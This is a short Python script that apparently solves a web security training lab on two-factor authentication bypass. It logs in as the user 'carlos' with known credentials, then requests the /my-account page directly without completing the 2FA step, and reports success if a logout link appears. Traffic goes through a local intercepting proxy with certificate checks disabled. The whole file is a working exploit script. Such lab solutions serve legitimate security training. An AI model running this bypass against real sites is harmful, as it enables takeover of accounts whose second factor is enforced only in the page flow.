import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url:str, s:requests.Session):
    login_url = url + '/login'
    login_data = {'username': 'carlos', 'password': 'montoya'}
    try:
        r = s.post(login_url, login_data, allow_redirects=False, verify=False, proxies=proxies, timeout=5)
        try:
            r = s.get(url + '/my-account', verify=False, proxies=proxies, timeout=5)
            if 'Log out' in r.text:
                print("2FA Bypassed Successfully!")
                return True
            else:
                print("Failed to bypass 2FA")
                return False
        except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            return False
    except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            print("Failed to login")
            return False
def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    if access_carlos_account(url, s):
        print("Lab Solved!!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()